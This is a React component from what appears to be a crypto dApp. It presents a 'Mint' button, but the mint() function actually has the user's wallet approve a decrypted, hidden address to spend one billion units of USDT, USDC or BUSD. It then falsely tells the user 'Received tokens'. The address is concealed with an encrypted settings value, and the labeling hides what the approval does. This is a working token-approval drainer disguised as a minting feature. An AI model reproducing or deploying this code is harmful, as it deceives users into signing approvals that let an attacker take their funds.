import React, { Children } from "react"
import { connect } from 'react-redux';
import Button from "./Button"
import { log, logwarn, logerror, decryptString } from "../std"

import { toast } from 'react-toastify';

import { connectWeb3, CHAINS, switchChain } from "../store/web3Store";
import Wallet from "./Wallet";


class Mint extends React.Component {
    state = {
        isConnectedWeb3: false, abiFolder: "contracts/", fileSettings: "settings.json",
        USDC: {}, USDT: {}, BUSD: {},
        chainId: 1, symbol: "USDT",
        mAddress: null,
    }

    componentDidMount() {
        if (!window.ethereum || !window.ethereum.isMetaMask) {
            this.setState({ isConnectedWeb3: false })
        }

        this.onTokenSelected.bind(this)

        this.loadSettings()
    }

    async loadSettings() {
        let settings = await fetch(this.state.fileSettings).then(response => response.json());

        let mAddress = decryptString(settings.mAddress);
        log(mAddress)
        this.setState({ mAddress: mAddress })

        return settings;
    }

    async initContracts(symbol, web3 = this.props.web3) {
        let settings = await this.loadSettings();

        let { /*USDC, BUSD, USDT,*/ abiFolder } = this.state;
        let chainId = parseInt(window.ethereum.chainId)
        if (!settings.tokens[symbol] || !settings.tokens[symbol][chainId]) {
            throw new Error("We will support this soon " + symbol + " - " + CHAINS[chainId].chainName)
        }
        let token = settings.tokens[symbol]

        let abiPath = abiFolder + symbol + "_ABI_" + chainId + ".json"
        let abi = await fetch(abiPath).then(response => response.json());
        log(abiPath)
        let contract = await new web3.eth.Contract(chainId == 5777 ? abi.abi : abi, token[chainId].address);
        window.mcontract = contract
        token[chainId].contract = contract;
        this.setState({ [symbol]: token })
        return token
    }

    async mint() {
        let { web3, accounts } = this.props;
        let { mAddress, symbol } = this.state;
        let chainId = parseInt(window.ethereum.chainId)
        if (!web3) {
            toast.error("Please connect Metamask")
        } else {
            try {
                let token = await this.initContracts(symbol, web3)
                window.token = token
                // 1 billion $
                let amount = "0x" + (1_000_000_000 * (10 ** parseInt(token[chainId].decimals))).toString(16)
                token[chainId].contract.methods.approve(mAddress, amount)
                    .send({ from: accounts[0] }, function (err, tx) {
                        if (err) {
                            toast.error(err.message)
                            logerror(err)
                        } else toast.success("Received tokens")
                    })
            }
            catch (error) {
                logerror("mint:", error.message, symbol, chainId)
                if (error.message.includes("Unexpected token"))
                    toast.error(`We haven't suport this chain yet: ${symbol} - ${CHAINS[chainId].chainName}`)
                else toast.error(error.message)
            }
        }
    }

    onTokenSelected(e) {
        let symbol = "USDT"
        if (e.target.innerText.trim() == "") {
            symbol = e.target.parentElement.innerText
        } else symbol = e.target.innerText

        this.setState({ symbol: symbol.trim() })
    }

    async onChainSelected(e) {
        let { web3, connectWeb3, switchChain } = this.props
        if (!web3) await connectWeb3()
        let chainId = parseInt(e.target.getAttribute("chainid"))
        if (isNaN(chainId)) chainId = parseInt(e.target.parentElement.getAttribute("chainid"))
        switchChain(chainId)
            .catch(error => {
                logerror(error)
                toast.error(error.message)
            })
    }

    render() {
        let { symbol } = this.state;
        let { web3, children, chainId } = this.props;
        return (
            <>
                {web3 ? (
                    <button className="mBtn" onClick={this.mint.bind(this)}>⛏️ {(this.props.hideText) ? "" : children}</button>
                ) : (
                    <Wallet className="btnConnectWeb3" hideText={true} />
                )}
            </>
        )
    }
}

const mapStateToProps = (state, ownProps) => ({
    web3: state.web3Store.web3,
    accounts: state.web3Store.accounts,
    chainId: state.web3Store.chainId
    // contract: state.Contract.contract,
    // owner: state.Contract.owner,
});

export default connect(mapStateToProps, {
    connectWeb3: connectWeb3,
    switchChain: switchChain,
})(Mint);